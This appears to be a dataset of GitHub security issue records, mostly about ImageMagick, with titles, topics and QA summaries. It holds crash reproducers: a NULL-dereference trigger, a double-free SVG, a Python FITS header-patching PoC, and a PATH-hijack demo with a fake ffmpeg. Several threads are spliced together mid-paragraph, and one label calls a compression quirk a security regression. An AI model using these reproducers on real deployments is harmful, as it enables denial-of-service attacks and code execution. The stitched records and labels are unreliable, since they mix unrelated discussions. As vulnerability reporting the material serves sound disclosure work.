title: NULL pointer dereference in WriteHEICImage when heif_nclx_color_profile_alloc fails
security_topic: NULL pointer dereference causing denial of service in HEIC image writing
qa_summary: Whether the NULL-pointer crash in WriteHEICImage from heif_nclx_color_profile_alloc failing is a security-relevant denial-of-service issue, anchored on CWE-476 and the reported CVSS 6.5 crash description.

comments.author: aarushidwi
comments.body:
## Description

`WriteHEICImage()` in `coders/heic.c` (line 1484) calls `heif_nclx_color_profile_alloc()` but does not check for a NULL return before dereferencing the pointer on lines 1485-1488. Under memory pressure or allocation failure, this causes a SIGSEGV (crash) at address `0x4`.

The bug is in the `heic:cicp` option handling path, conditionally compiled under `LIBHEIF_NUMERIC_VERSION >= HEIC_COMPUTE_NUMERIC_VERSION(1,17,0)`.

## Affected Version

- ImageMagick 7.1.2-15 (current `main`)
- Requires libheif >= 1.17.0

## Vulnerable Code

```c
// coders/heic.c:1484-1488
nclx_profile=heif_nclx_color_profile_alloc();
cicp.rho=(double) nclx_profile->color_primaries;         // crash if NULL
cicp.sigma=(double) nclx_profile->transfer_characteristics;
cicp.xi=(double) nclx_profile->matrix_coefficients;
cicp.psi=(double) nclx_profile->full_range_flag;
```

## Steps to Reproduce

1. Build ImageMagick 7.1.2-15 with libheif >= 1.17.0
2. Create test image: `magick -size 100x100 xc:blue test.jpg`
3. Trigger under OOM conditions or with LD_PRELOAD stub that forces NULL return:
   ```
   LD_PRELOAD=./fake_heif.so magick test.jpg -define heic:cicp=1 output.heic
   ```
4. Observe: `SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x4}` → process crash (exit 134)

## Impact

- **CWE-476**: NULL Pointer Dereference
- **CVSS 6.5**: `CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H`
- Denial of service — crashes the ImageMagick process, affecting any concurrent image processing

## Suggested Fix

Add a NULL check after allocation, consistent with ImageMagick conventions:

```c
nclx_profile=heif_nclx_color_profile_alloc();
if (nclx_profile == (struct heif_color_profile_nclx *) NULL)
  ThrowWriterException(ResourceLimitError,"MemoryAllocationFailed");
```

A PR with this fix is submitted: see linked PR.

title: SIGABRT (double-free) converting SVG with `gradientTransform` on `<linearGradient>`
security_topic: double-free regression in SVG gradientTransform handling after a security fix
qa_summary: Whether the SVG `gradientTransform` double-free crash is a security-relevant memory-safety regression introduced by commit `9db96365e` (the GHSA-xpg8-7m6m-jf56 fix), and the answer rests on that commit plus the linked fix in #8583.

comments.author: ryan-williams
comments.body:
### Description

`magick` crashes with a double-free (SIGABRT, exit code 134) when converting any SVG containing a `gradientTransform` attribute on a `<linearGradient>` element. Removing the attribute makes conversion succeed. ImageMagick 6 is not affected.

### Error output

```
free(): double free detected in tcache 2
Aborted (core dumped)
```

### Minimal reproducer SVG

```xml
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512">
  <defs>
    <linearGradient id="g" gradientTransform="matrix(1 0 0 1 0 0)" gradientUnits="userSpaceOnUse">
      <stop offset="0" style="stop-color:red"/>
      <stop offset="1" style="stop-color:blue"/>
    </linearGradient>
  </defs>
  <rect fill="url(#g)" width="512" height="512"/>
</svg>
```

Removing `gradientTransform="matrix(1 0 0 1 0 0)"` (even though it's an identity matrix) makes the conversion succeed.

### Steps to reproduce

```bash
# Save the SVG above as crash.svg, then:
magick crash.svg crash.png
# → exit code 134 (SIGABRT)
```

### CI repro

Full automated repro with GitHub Actions: https://github.com/ryan-williams/imagemagick-svg-crash

GHA run showing the crash: https://github.com/ryan-williams/imagemagick-svg-crash/actions/runs/22469220910

### Versions tested

| Version | Result |
|---|---|
| ImageMagick 7.1.2-16 (Beta), Ubuntu x86_64 (source build) | **crashes** (double-free) |
| ImageMagick 7.1.2-15, macOS arm64 (Homebrew) | **crashes** |
| ImageMagick 6.9.12-98, Ubuntu x86_64 (apt) | works fine |
| librsvg 2.58.0 (`rsvg-convert`) | works fine |

### Root cause

Introduced in `9db96365e` (2026-02-15, tag `7.1.2-14`) — the security fix for GHSA-xpg8-7m6m-jf56. That commit changed `value` in `SVGStartElement`'s attribute loop from a non-owned `const char *` alias to a heap-allocated `char *` via `SVGEscapeString()`, with `DestroyString(value)` added at the end of each iteration. The `gradientTransform` and `transform` inner token-parsing loops have reassigned `value` to `tokens[j+1]` since 2009 (`3ed852eea`); previously harmless, this now leaks the original allocation and double-frees the token.

Fix: #8583

### System info

Tested on macOS arm64 (Homebrew) and Ubuntu x86_64 (GHA). Both crash with IM7; IM6 works fine on both.

---

*This issue was generated with the help of [Claude Code](https://claude.ai/claude-code) (claude-opus-4-6).*

[ImageMagick/ImageMagick#8582]: https://github.com/ImageMagick/ImageMagick/issues/8582

comments.author: ryan-williams
comments.body:
### Root cause

Introduced in `9db96365e` (2026-02-15, tag `7.1.2-14`) — the security fix for GHSA-xpg8-7m6m-jf56.

That commit changed `value` in `SVGStartElement`'s attribute loop from a `const char *` alias (pointing directly into `attributes[i+1]`, never freed) to a heap-allocated `char *` via `SVGEscapeString()`, with `DestroyString(value)` added at the end of each iteration.

The `gradientTransform` and `transform` inner token-parsing loops have had `value=(char *) tokens[j+1]` since the SVG coder was first written (2009, `3ed852eea`). Before `9db96365e`, that was harmless — `value` wasn't owned memory. After, reassigning `value` inside the inner loop:
1. **Leaks** the original `SVGEscapeString()` allocation (pointer is clobbered)
2. **Double-frees** `tokens[j+1]` (freed once by the token cleanup loop, then again by `DestroyString(value)`)

Fix in #8583: use a separate `token_value` local in each inner loop.

(Also added to the issue description above.)

comments.body:
Maybe there are two potential NPD, the alpha-as-PNG path around line 12356 and the main JDAT-writing path around line 12732.
In coders/png.c in WriteOneJNGImage(), two ImageToBlob() results were originally used without an immediate NULL check and could cause a null-pointer dereference if ImageToBlob() fails but the code still passes blob to WriteBlob()/crc32().
In contrast, other coders typically add a guard right after ImageToBlob(), for example coders/cals.c around line 570, coders/pdf.c around line 1104, coders/ps3.c around line 311, and coders/magick.c around line 13279.

title: Integer Overflow in FITS Image Dimension Parsing
security_topic: integer overflow in FITS image dimension parsing
qa_summary: Whether the FITS dimension integer overflow in `coders/fits.c` is a denial-of-service or out-of-bounds risk, as confirmed by the maintainer’s patch plan for the main Git branch and upcoming beta releases.

comments.author: ylwango613
comments.body:
### ImageMagick version

7.1.2-13

### Operating system

Linux

### Operating system, version and so on

22.04.5 64bit

### Description

During FITS parsing, NAXIS1 and NAXIS2 (image width and height) are first multiplied as int values to compute the total number of pixels; when the values are large, this arithmetic overflows and yields an incorrect pixel count. This can cause the program to crash or abort parsing (denial of service), or lead to excessive memory allocation and potential out-of-bounds access.

### Steps to Reproduce

### PoC
use the following fits:
[[fits.gsfc.nasa.gov/samples/WFPC2u5780205r_c0fx.fits](https://fits.gsfc.nasa.gov/samples/WFPC2u5780205r_c0fx.fits)](https://fits.gsfc.nasa.gov/samples/WFPC2u5780205r_c0fx.fits)

Use the follow py file to transfer it to 65536*65537
```
#!/usr/bin/env python3
import sys
from typing import Tuple, Dict

FITS_BLOCK = 2880
CARD = 80

def _read_cards(buf: bytes, max_cards: int = 4096) -> Tuple[list[bytes], int]:
    """
    Read cards from buf[0:] in 80-byte increments until finding the END card (keyword == 'END').
    Returns (cards, header_len_bytes), where header_len_bytes is the padded header length (2880-aligned).
    """
    cards = []
    end_index = None

    # Need to at least cover up to END; typically primary header won't be too long, setting an upper limit here
    for i in range(0, min(len(buf), max_cards * CARD), CARD):
        card = buf[i:i + CARD]
        if len(card) < CARD:
            break
        cards.append(card)
        keyword = card[0:8].decode("ascii", errors="replace").rstrip()
        if keyword == "END":
            end_index = i + CARD
            break

    if end_index is None:
        raise ValueError("Cannot find END card in the first part of the file (primary header seems corrupted).")

    # Total header length needs to be padded to 2880 boundary (ImageMagick code will read the padding)
    header_len = ((end_index + FITS_BLOCK - 1) // FITS_BLOCK) * FITS_BLOCK
    return cards, header_len

def _parse_key_value(card: bytes) -> Tuple[str, str]:
    """
    Parse the keyword and value string from a card (as lenient as possible).
    """
    kw = card[0:8].decode("ascii", errors="replace").strip()
    rest = card[8:].decode("ascii", errors="replace")
    return kw, rest

def _get_int_value_from_card_rest(rest: str) -> int | None:
    """
    Extract an integer from the card[8:] string (handles '= <num>' format).
    """
    s = rest
    if len(s) == 0:
        return None
    if s[0] != "=":
        return None
    # Skip "= ", then strip
    s = s[1:]
    if s.startswith(" "):
        s = s[1:]
    s = s.strip()
    # Value may have a comment "/ ..."
    if "/" in s:
        s = s.split("/", 1)[0].strip()
    # FITS integers are typically right-aligned and may have a sign
    try:
        return int(s, 10)
    except ValueError:
        return None

def _format_int_card(keyword: str, value: int, comment: str = "") -> bytes:
    """
    Generate a standard FITS 80-byte card: KEYWORD= <value> / comment
    Note: keyword must be <=8 bytes and ASCII.
    """
    kw = (keyword[:8]).ljust(8)
    rhs = f"= {value:20d}"  # Common FITS format: numeric field width 20
    if comment:
        rhs += f" / {comment}"
    rhs = rhs[:72].ljust(72)
    card = (kw + rhs).encode("ascii", errors="strict")
    if len(card) != CARD:
        raise AssertionError("card length is not 80 bytes")
    return card

def _extract_primary_header_fields(cards: list[bytes]) -> Dict[str, int]:
    fields: Dict[str, int] = {}
    for c in cards:
        kw, rest = _parse_key_value(c)
        kw_low = kw.lower()
        if kw_low in ("bitpix", "naxis", "naxis1", "naxis2", "naxis3", "simple"):
            v = _get_int_value_from_card_rest(rest)
            if v is not None:
                fields[kw_low] = v
    return fields

def patch_naxis(in_path: str, out_path: str, new_naxis1: int, new_naxis2: int) -> None:
    data = open(in_path, "rb").read()

    cards, header_len = _read_cards(data)
    fields = _extract_primary_header_fields(cards)

    if "bitpix" not in fields:
        raise ValueError("BITPIX not found in primary header; cannot compute data size safely.")
    if "naxis" not in fields:
        raise ValueError("NAXIS not found in primary header.")
    bitpix = fields["bitpix"]
    naxis = fields["naxis"]

    if naxis < 2:
        # You're now changing NAXIS1/2; if naxis<2, the FITS primary HDU isn't a 2D image
        # ImageMagick code also requires rows/columns > 0 to proceed
        # Here we directly set NAXIS to 2 (conservative approach)
        naxis = 2

    if bitpix == 0 or (abs(bitpix) % 8) != 0:
        raise ValueError(f"Unsupported BITPIX={bitpix} for this patcher (expect 8/16/32/64/-32/-64).")
    bytes_per_pixel = abs(bitpix) // 8

    if new_naxis1 <= 0 or new_naxis2 <= 0:
        raise ValueError("new NAXIS1/NAXIS2 must be positive.")

    # --- Modify header cards (don't change card count/total bytes, only modify corresponding card content)
    def replace_or_append(keyword: str, value: int):
        nonlocal cards
        key_upper = keyword.upper()
        replaced = False
        for idx, c in enumerate(cards):
            kw = c[0:8].decode("ascii", errors="replace").strip().upper()
            if kw == key_upper:
                cards[idx] = _format_int_card(key_upper, value)
                replaced = True
                break
        if not replaced:
            # Inserting a new card before END: this would change header length and subsequent offsets.
            # To "never break the structure", we don't insert.
            # In actual FITS, NAXIS1/2 should exist; if not, the original file is very atypical.
            raise ValueError(f"{key_upper} card not found; refusing to insert cards (would shift the file).")

    # If needed, first set NAXIS to 2 (prerequisite: NAXIS card originally exists)
    if "naxis" in fields:
        replace_or_append("NAXIS", naxis)
    else:
        raise ValueError("NAXIS card not found; cannot safely patch without shifting.")

    replace_or_append("NAXIS1", new_naxis1)
    replace_or_append("NAXIS2", new_naxis2)

    # --- Reassemble header and maintain its length as the original header_len (2880-aligned)
    new_header = b"".join(cards)
    if len(new_header) > header_len:
        # Theoretically won't happen (we didn't insert cards)
        raise ValueError("Patched header unexpectedly exceeds original padded header length.")
    new_header = new_header.ljust(header_len, b" ")

    # --- Handle primary data unit
    old_data = data[header_len:]
    new_data_bytes = new_naxis1 * new_naxis2 * bytes_per_pixel

    # Conservative: only ensure the primary data area is long enough; don't handle extensions (if the original file has extensions, changing dimensions may cause semantic inconsistency)
    if len(old_data) < new_data_bytes:
        new_data = old_data + (b"\x00" * (new_data_bytes - len(old_data)))
    else:
        new_data = old_data[:new_data_bytes]

    # Extra: pad data to 2880 per FITS convention (not mandatory, but more standard)
    pad = (-len(new_data)) % FITS_BLOCK
    if pad:
        new_data += b"\x00" * pad

    with open(out_path, "wb") as f:
        f.write(new_header)
        f.write(new_data)

def main():
    if len(sys.argv) != 5:
        print(f"Usage: {sys.argv[0]} <in.fits> <out.fits> <new_naxis1> <new_naxis2>")
        sys.exit(2)
```

title: Insecure File Access Due to External Control of Environment Variables in Magick++
security_topic: path traversal via environment-variable-controlled file paths
qa_summary: Whether the path traversal via SRCDIR/MAGICK_FONT can be mitigated by ImageMagick’s documented security policy that denies file reads outside an allowed directory.

comments.author: weaver4VD
urban-warrior
comments.body:
ImageMagick uses this pattern in its demos and test utilities, but these executables are **not** included in a standard installation. When the code is used independently, developers can harden it by sanitizing any user‑controlled paths before passing them to ImageMagick.

As an additional layer of protection, a user may restrict ImageMagick’s filesystem access by denying all reads except those from explicitly allowed directories. A [security policy](https://imagemagick.org/script/security-policy.php) such as the following can enforce this:

```xml
<policymap>
  <!-- Deny all file reads by default -->
  <policy domain="path" rights="none" pattern="*" />

  <!-- Allow reads ONLY from /opt/ImageMagick/ -->
  <policy domain="path" rights="read" pattern="/opt/ImageMagick/*" />
</policymap>
```

How this policy works

- Global deny rule — Blocks all filesystem reads (pattern="*").
- Allow rule — Re‑enables read access only for files located under /opt/ImageMagick/.

All other paths, including system directories such as /etc/, /home/, /var/, and any relative path traversal attempts like ../../,  are denied.

title: Provide command-line option to disable delegates; or, identify is extremely slow on video files
security_topic: per-invocation disabling of delegates vs security policy configuration
qa_summary: Whether disabling delegates per command is needed to prevent code injection and untrusted input from triggering external commands, and the answer rests on the documented ImageMagick security policy and the `policy domain="delegate" rights="none" pattern="*"` example.

comments.author: Earnestly
comments.body:
### Is your feature request related to a problem? Please describe.

When attempting to use `magick -ping "$file" -format '%[mime:type]\n' info:` on video files, such as `video/mp4`, IM will delegate to:

```
video:decode =>          "ffmpeg' -nostdin -loglevel error -i '%s' -an -f rawvideo -y %s '%s"
```

For large, or really even small video files, this process can take an extordinary amount of time and cpu usage.

_(Note that interrupting `magick` with `Ctrl-C` does not kill the `ffmpeg` child so the process remains running, nor does it clean up `/tmp` symlinks.)_


### Describe the solution you'd like

Rather than trying to account for each delegate and their potential onerous behaviours, I would very much like the ability to disable all delegates via the command-line.

I'm aware that this might be possible by either modifying `/etc/ImageMagick-7/delegates.xml` or changing the policy in `/etc/ImageMagick-7/policy.xml`, but both of these require root permissions and effect global usage of `magick` which would not be my intention.

Ideally `magick` could introduce a `-define` which allows me to disable the use of delegates entirely.

_(PS. I am not personally interested in using delegates and so do not need any kind of per-delegate control.)_

comments.author: urban-warrior
comments.body:
Add `[0]` to your command-line to speed up video processing:

```
magick -ping "$file[0]" -format '%[mime:type]\n' info:
````

Adding a command-line option could be a security issue.  By the default, ImageMagick polices are controlled by the administrator.  If you perform a non-standard install, ImageMagick can instead consult your local `delegates.xml` and you can disable delegates at will by altering the default configuration.

comments.author: snibgo
comments.body:
> I'm aware that this might be possible by either modifying /etc/ImageMagick-7/delegates.xml or changing the policy in /etc/ImageMagick-7/policy.xml, but both of these require root permissions and effect global usage of magick which would not be my intention.

You can create a `policy.xml` for individual users. This will apply further limits, on top of any imposed by the global `policy.xml`.

comments.author: Earnestly
comments.body:
I really do not want to create per-user policy files. I also won't be able to use `[0]` notation (hopefully) once `filename:literal=true` works for both inputs and outputs.

I'm also unsure why it would be a security issue if a user is allowed to _disable_ delegates on a per-command basis. If anything, it would make imagemagick _more_ secure as delegates are just commands, resolved via `PATH`, and users have full control over that.

Please consider nicely what you're suggesting. If someone wants to use `magick` in a script, just one command in many, and the author wants some guarantee that arbitrary inputs are not going to wreak havok, there is currently _no_ way to do it.

Because `magick` has no way to disable delegates, and because delegates are user controlled objects, by dint this means any such script may execute arbitrary code based on carefully constructed inputs, whether it's `magick`'s own filename evaluation strategies or full execution control based on delegate.

I have no idea why this behaviour should be at the sole discretion of a "system admin", as it means any script that uses `magick` now relies on a carefully controlled and sanitised execution environment.

```sh
$ cat ffmpeg
#!/bin/sh --
echo hi > owned

$ PATH=.:$PATH magick -ping video/1917.mp4 -format '%[mime:type]\n' info:
magick: insufficient image data in file `/tmp/magick-5EIzi9um6SIwIOvJRf1zJ0nd4fuEaiaD' @ error/webp.c/ReadWEBPImage/560.

$ cat owned
hi
```

comments.author: fmw42
comments.body: Can you explain why you cannot use [0] to restrict to the first image in the video?  Do you need to do your processing command on all the images in the video?  Why?

comments.author: urban-warrior
comments.body: The wonderful thing about open-source, is anyone can post a patch as a pull request and the development team will review for inclusion. Have fun.

comments.author: Earnestly
comments.body:
> The wonderful thing about open-source, is anyone can post a patch as a pull request and the development team will review for inclusion. Have fun.

Would it be reasonable to check for a `-define` option in `delegate.c` to control the logic of `ExternalDelegateCommand`, or to make the check at any callsite using delegates?

comments.author: urban-warrior
comments.body:
Defines would be the simplest solution for your request.   However, we are not interested in supporting a define as you can already stop all delegate execution with a single security policy.:

```
  <!-- Do not permit any delegates to execute. -->
  <policy domain="delegate" rights="none" pattern="*"/>
```

If possible, we try to follow the design principle of only have one way to do one thing.

I disagree with the reasoning that you should follow a design principle of "only have one way to do one thing" when specifically dealing with program configuration. Here "configuration" means any external file that controls the operation of the program. (Environment variables in contrast are more a form of IPC.) comments.author: Earnestly
comments.body:
> > Can you explain why you cannot use [0] ...
> > Because the inputs are user controlled.
> 
> **This is not a very clear and understandable reason, at least for me. Please show some code so that we can understand your issue and why you cannot specify an image name.**

Oh sorry, I'll try to explain my reasoning:

_For a bit of background here is a good article that covers code injection: https://www.more-magic.net/posts/structurally-fixing-injection-bugs.html_

Everything is about encoding. And a lot of it is often accidental: here accidental means that formats are used but not enforced or checked.

Consider a UNIX filename consisting of an arbitrary sequence of bytes, excluding `/`, terminated by a NUL byte. In contrast a Windows filename excludes many more characters and encodes them using the USC-2, it also imparts special meanings to files with specific names.

One consequence of this is that valid UNIX and Windows filenames **cannot be represented** in JSON (as it only supports UTF-8), for example. Yet people do this anyway, largely successfully (this is the accidental part).

When ImageMagick parses filenames and evaluates their meaning, it has implicitly (or explicitly) created a new "encoding" for filenames, which are at variance with UNIX/Windows filenames (like JSON, but different).

The problem arises when the inputs to your program, which you have no control over, uses one encoding (datatype) while the software expects another. There are generally three ways to solve this problem; one is to encode the input to the encoding the program expects, another is to ensure the software treats the input as an array of bytes and to not interpret the bytes at all. The second approach is the ideal solution as it obviates the need to "escape" or "sanitise" inputs.

In other words, by never exposing user-supplied data to code evaluation, you will never suffer from code injection. However, if you cannot do that (such as interpreting image data) then you must enforce the encoding (this is what your oss-fuzz tests are doing) and ensure your parser can deal with malformed input. (cf. Weird Machines)

What I am essentially asking for is a way to provide this data, un-interpreted. Consider SQL and prepared statements as analogous to my request. However if "prepared statements" are not possible (i.e. `filename:literal=true` for both input and output filenames) then I must resort to something like `safe_escape_string_for_real_this_time()`.

If there is no "encoding" for imagemagick filenames, e.g. `png\:\-` as a filename vs. `png:-` as special meaning to imagemagick, then I can only detect this encoding/datatype, check it, and error out as a "type mismatch". This is the third option.

_PS. A good set of examples are shell scripts which rely on word splitting that only work when file names don't contain spaces, see the myriad ways shell scripts tend to accidently practice code injection without realising: https://mywiki.wooledge.org/BashProgramming/05_

Sorry if a bit long winded, but hopefully it makes my point of view a bit clearer.

_PPS. Yes, this started as an issue with `ffmpeg` being slow when attempting to query file information, but once I saw `magick -list delegates` I decided that I would much rather completely disable this feature for my scripts which don't need it._

comments.author: urban-warrior
comments.body:
The administrator has full control over the machine, allowing them to decide how ImageMagick should operate in their environment. This approach is commonly adopted on both Linux and Windows hosts. Alternatively, the administrator may choose to install ImageMagick using the "no-install" option. By doing so, they delegate the responsibility for configuration to the user.

In such cases, the user gains the flexibility to override the system's delegate, security policies, and other settings by creating a custom configuration within their home directory. Another viable option for users is to build a personalized instance of ImageMagick directly in their home directory, granting them complete freedom to modify the configuration files as needed.

comments.author: urban-warrior
comments.body: We don't understand how a configuration file could be pointless.  Configuration files are very common with programs as a way to initialize an environment and as a way to change the initialization.   Putting configurations in the code is an issue because its not easy to change on demand without a rebuild  You can install ImageMagick and at modify its behavior through the configuration files. I said it on the libjxl issue, but lossy encoding stores color space Enums (stripped down versions of common color spaces like sRGB, Rec2020, P3, ect) instead of the original ICC. It seems ImageMagick is allowing libjxl to use the Enums for lossless too. It shouldn't have a noticeable visual impact, but it's not truly lossless either.

This may help figure out what needs to be changed https://github.com/libjxl/libjxl/blob/0c1aba1d51ed32f61be4de638f075f2b199082d0/lib/jxl/test_utils.cc#L792

comments.author: ferdnyc
comments.body:
Thanks @jonnyawsom3 

I see the issue now. The delegate's `WriteJXLImage()` _always_ calls `JXLEncoderSetColorEncoding()` (via `JXLWriteMetadata()`)... but the docs for that function clearly say that only one of `JXLEncoderSetColorEncoding()` or `JXLEncoderSetICCProfile()` can be used.

The delegate never calls `JXLEncoderSetICCProfile()` currently, and even if it did that would be invalid, because it's still going to unconditionally call `JXLEncoderSetColorEncoding()`.

...It **will** attempt to preserve any EXIF or XMP metadata by applying it to the output image with `JXLEncoderAddBox()`, but that doesn't help if the profile _isn't in_ an EXIF or XMP blob (like when it comes from a JXL input file, but possibly also via a PNG `iCCP` chunk or other non-EXIF/XMP source)... and from what @jonnyawsom3 says about the overrides I'm not sure profiles from those metadata blobs would be used either, if `JXLEncoderSetColorEncoding()` is still called.

The delegate is treating `JXLEncoderSetColorEncoding()` as essential, required metadata that must always be set on an image to be encoded. But from what I can tell based on the documentation and @jonnyawsom3 's comments, nothing could be further from the truth, and it should ONLY be used when explicitly _not_ applying an ICC profile.

comments.author: ferdnyc
comments.body:
Heh. The delegate's encode function even does this:

```c
  if (image_info->quality == 100)
    basic_info.uses_original_profile=JXL_TRUE;
```

...But then makes a liar out of itself by never calling `JXLEncoderSetICCProfile()` to attach the original color profile that it's telling the decoder it's supposed to use.

(I think the assumption might have been that this tells the _encoder_ to use the original profile... but IIUC from the docs, it's actually just a flag for the _decoder_ that tells it how to decode the JXL file that's output by the encoder. If the profile doesn't get attached to that output, the flag doesn't really mean anything.)

comments.author: jonnyawsom3
comments.body:
Close, but the naming is throwing you off like many before. `basic_info.uses_original_profile` actually controls the internal color space, XYB for lossy and RGB for lossless. Libjxl will throw an error if you try to do lossless XYB.

I think you're right about SetICC and SetColorEncoding though.

Honestly as a user I expect that when I specify -depth 1, there would be no alpha channel involved, and I'd expect that available compression methods would depend on the output image colour parameteres, not on input image parameters.

comments.author: urban-warrior
comments.body:
The patch was applied because we discovered Fax compression does not support anything other than 1 channel.   Setting depth of 1 sets each channel depth to 1, including the alpha channel.  Notice the alpha channel for this command:

```
magick -density 300 input.pdf -depth 1 -verbose info: | grep Alpha
  Type: PaletteAlpha
    Alpha: 1-bit
```

comments.author: username-infine-not-available
comments.body:
Well, the input.pdf in question was generated by imagemagick itstelf from a JPEG image. The source had no alpha. In fact I just tried to info: several PDFs of different nature - a Kyocera scan, an image converted to PDF with imagemagick (also with `-alpha off`), an open office document with no images (`pdfimages -list` shows empty) saved to PDF. They all show alpha preseent. Apparently you can't have PDF without alpha.

This means if you want to get a compressed tiff from any PDF, you must specify `-alpha off`, but it's black magic that can only be known by looking at the source code. If you don't do it, you silently get an uncompressed tiff for entirely unknown and unknowable reason. There is no meaningful difference between `-alpha on` and `-alpha off` results observable with exiftool or mediainfo or magick identify - there's no mention of alpha in any of them. 

In fact I just experimented with an actual transparent PNG source. `magick input.png output.tiff` produces an image with 4 channels. `magick input.png -alpha off output.tiff` produces an image with 3 channels. `magick input.png -compress Fax output.tiff` produces an image with 1 1-bit channel. It still removes all the channels, just doesn't do compression. Silently.   

From a user perspective this looks like Fax compression just not working. 

If the intended behaviour is to prevent compression of sources containing an alpha channel, there probably should be a warning or a failure. As it is, it does one half of the job (converting image to 1 channel 1-bit black and white) and silently omits the other half of the job. It's impossible to tell why you aren't getting the result you want.

comments.author: urban-warrior
comments.body: We leverage the Ghostscript delegate to render PDF and the default device is `pngalpha` which renders the alpha channel.  You can instead change the device in `delegates.xml` to `png16m` to render PDF/PS without transparency.

comments.author: emk2203
comments.body:
For anyone arriving here via Google and in search of a broader solution:

[This comment on Stackoverflow](https://stackoverflow.com/questions/10934456/imagemagick-pdf-to-jpgs-sometimes-results-in-black-background#comment99113684_16293489) gives a better approach.

>I am converting PDF to TIFF (for faxing) and was using "-alpha off" by default, but would see all black pages if the page had PDF form fields or signatures pasted in as transparent PNG's. Changing to "-alpha remove" worked as florian suggests. I played with other alpha values but remove is the way to go.

To avoid most issues, `magick -density 300 input.pdf -compress Fax -alpha remove -background white output.tiff` is recommended.

human_note: Ghostscript delegate default pngalpha rendering introduces alpha channel causing Fax/Group4 TIFF compression to be skipped in PDF rasterization pipeline; mitigated via delegates.xml device change to png16m; accepted as security-relevant image processing pipeline regression affecting compression behavior and external delegate trust boundary

title: Converting some images to PICT results in files that will crash a classic Mac system
security_topic: PICT file format validity causing classic Mac OS crash
qa_summary: Whether ImageMagick’s PICT encoder is producing malformed files that crash classic Mac OS, and the answer rests on the cited Inside Macintosh: Volume V documentation plus the specific ImageMagick source lines in pict.c that should compare `bytes_per_line > 250`.

comments.author: briankendall
comments.body:
### ImageMagick version

7.1.1-34

### Operating system

MacOS

### Operating system, version and so on

macOS 13.6.5

### Description

Converting certain images to a PICT file will produce files that will crash the system when attempting to view them on a classic Mac OS system. I've reproduced the crash on Macintosh System 7.1, Mac OS 8, and Mac OS 9.

Converting the PICT file back to a png using ImageMagick does not present any issues. I have not yet identified a modern app that presents a problem viewing the bad PICT file ImageMagick produces.

I've attached both the png file that exhibits this bug and the resulting PICT file that will crash a classic Mac.

### Steps to Reproduce

1. Convert the attached png file to a pict with the following:
    `magick bad.png bad.pict`
2. Copy `bad.pict` to a system running classic Mac OS and open it in any application that can view PICT files (such as SimpleText)
3. System freezes or displays a system error

### Images

![bad](https://github.com/user-attachments/assets/b782b586-90d3-40fc-bde1-8438975e597d)
[bad.pict.zip](https://github.com/user-attachments/files/18142059/bad.pict.zip)

comments.author: briankendall
comments.body:
> Perhaps Apple changed the PICT format between old classic Mac and newer OSX versions.

I don't believe that's the case. The latest PICT format is "Extended Version 2" which has been around since at least the 1990s, and which is what ImageMagick is producing based off of the version information in the outputted file.

comments.author: briankendall
comments.body:
SimpleText uses the same system-level API to display a PICT as every other app in classic Mac OS. I can trigger the crash using any application that can read PICT files.

It's possible that their implementation has a bug that would cause it to crash reading an otherwise valid PICT, but I think that's unlikely. Also, given that Apple's PICT implementation from classic Mac OS is essentially the canonical implementation, I think we need to assume that ImageMagick is producing invalid files.

comments.author: briankendall
comments.body: I do believe I found the issue. The key is in page 119 of Inside Macintosh: Volume V, where it describes how the pixel data of a PICT should be written out. Here's a screen shot of the relevant section: The key part is where it says "If rowBytes > 250". In `bad.pict`, rowBytes is 240, but the `byteCount` of each scanline is two bytes rather than one. I just manually modified the file so that the `byteCount` entries for each scanline is only one byte, and it fixed the file, in that classic Mac OS can now properly read it. (See : [fixed.pict.zip](https://github.com/user-attachments/files/18159393/fixed.pict.zip) ) This bug apparently affects ImageMagick's PICT reader as well, as it's unable to open `fixed.pict` and produces this error: error/pict.c/ReadPICTImage/1267. In fact, I think that points me to the error, see: https://github.com/ImageMagick/ImageMagick/blob/b77eb776838b6039834948bb63f8106a7980554b/coders/pict.c#L504 That should be: if (bytes_per_line > 250) Same here: https://github.com/ImageMagick/ImageMagick/blob/b77eb776838b6039834948bb63f8106a7980554b/coders/pict.c#L694 And here too: https://github.com/ImageMagick/ImageMagick/blob/b77eb776838b6039834948bb63f8106a7980554b/coders/pict.c#L1087

comments.author: bobfriesenhahn
comments.body: Failing to be able to read the existing PICT files that ImageMagick wrote for perhaps 30 years seems pretty brutal.

If that doesn't resolve the issue you could consider recompiling ImageMagick with `--with-gslib` to make sure you are always using the command line version of Ghostscript instead of the library calls.

title: Signature generation fails for SM2 private keys with ES256 algorithm for node 18 version
security_topic: unsupported SM2 key usage with ES256 algorithm
qa_summary: The developer needed to know if SM2 private keys can be used with the ES256 algorithm in jsonwebtoken, and the maintainer confirmed they are unsupported for JOSE per the IANA algorithm registry and Node.js limitations (see IANA JOSE list and Node PR #37066).

comments.author: balnenikhil
comments.body:
### Description

`jwt.sign(<payload>, <utf8 encoded SM2 private key>, { algorithm: 'ES256' })` fails with `"error":{"code":"ERR_OSSL_INVALID_DIGEST","library":"Provider routines","reason":"invalid digest"}`  when using node 18.17.0.

The above command works fine with node version 16 but fails with node versions 18 and 20.

### Environment

- **Version of this library used:** jsonwebtoken 9.0.0  and 9.0.2
- **Version of the platform or framework used:** nodejs 18.17.0

comments.author: panva
comments.body:
There is no registered JWS algorithm for SM2 keys[^iana] and ES256 requires the use of an EC key using the P-256 curve. Furthermore Node.js does not fully support SM2 keys.[^node]

Bottom line use of SM2 keys with JOSE is unsupported and out of scope.

[^iana]: https://www.iana.org/assignments/jose/jose.xhtml#web-signature-encryption-algorithms
[^node]: https://github.com/nodejs/node/pull/37066

title: Use a default of `["HS256"]` for `verify` to be in sync with default for `sign`
security_topic: default algorithm handling in JWT verification
qa_summary: The developer asked if jwt.verify accepts all algorithms (including "none") by default, and the answer cites the verify.js source at v8.5.1 (https://github.com/auth0/node-jsonwebtoken/blob/v8.5.1/verify.js#L99-L118) showing it does not.

comments.author: daniel-j-h
comments.body:
By default `sign` uses `options.algorithm: "HS256"`.

In contrast `verify` does not use `options.algorithms: ["HS256"]` by default - but instead accepts all algorithms.

This means by default we sign with HS256 but we verify and accept all algorithms - for example also the `none` algorithm.

If we're setting a default in sign we should set the same default in verify - and keep them in sync.

Thoughts?

comments.author: panva
comments.body:
source: https://github.com/auth0/node-jsonwebtoken/blob/v8.5.1/verify.js#L99-L118

> but instead accepts all algorithms

That is a false statement.

